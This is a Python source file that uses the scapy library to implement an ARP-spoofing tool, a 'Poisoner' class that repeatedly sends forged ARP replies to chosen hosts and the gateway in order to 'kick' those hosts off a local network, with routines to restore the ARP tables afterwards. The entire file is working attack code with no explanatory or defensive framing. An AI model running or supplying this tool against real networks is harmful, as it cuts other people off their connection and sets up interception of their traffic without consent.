from types import resolve_bases
from scapy.all import *
import time
import logging
from threading import Event, Thread

logger = logging.getLogger("SPOFFER")

class Poisoner:

    def __init__(self, hosts, gateway, targets_MAC, gateway_MAC) -> None:
        self.hosts = hosts
        self.gateway = gateway
        self.targets_mac = targets_MAC
        self.gateway_mac = gateway_MAC
        self.exit_event = Event() 
        self.stop = False


    def poison_host(self, target_ip, gateway_to_change, target_mac):
        try:
            packet = ARP(op = 2, pdst = target_ip, 
                            hwdst = target_mac, 
                            psrc = gateway_to_change)

            send(packet, verbose = False)
            return True

        except Exception:
            return False

        

    def restore(self, target_ip, gateway_to_change, target_mac, gateway_mac):
            try:
                packet = ARP(op = 2, pdst = target_ip, 
                                hwdst = target_mac, 
                                psrc = gateway_to_change,
                                hwsrc = gateway_mac)
                send(packet, verbose = False)
                return True

            except Exception:
                return False
    
    def kick_hosts(self):
        try:
            if not self.gateway_mac:
                logger.critical("Can't find gateway's mac address")
                exit()

            logger.info("Starting to kick...\n Press cntrl+c to stop")
            while True:
                if self.stop:
                    self.exit_event.set()
                    return

                for i, host in enumerate(self.hosts):
                    self.poison_host(host, self.gateway, self.targets_mac[i])
                    self.poison_host(self.gateway, host, self.gateway_mac)
                time.sleep(2)

        except Exception:
            self.exit_event.set()
            self.restore_hosts()

    def restore_hosts(self):
        self.exit_event.wait()
        for i, host in enumerate(self.hosts):
            self.restore(host, self.gateway, self.targets_mac[i] ,self.gateway_mac)
            self.restore(self.gateway, host, self.gateway_mac, self.targets_mac[i])
        logger.info("Stopped safely...")


    def start_kicking(self):
        self.thread = Thread(target=self.kick_hosts)
        self.thread.start()
        self.exit_event.wait()

    def stop_kicking(self):
        self.stop = True
        self.restore_hosts()

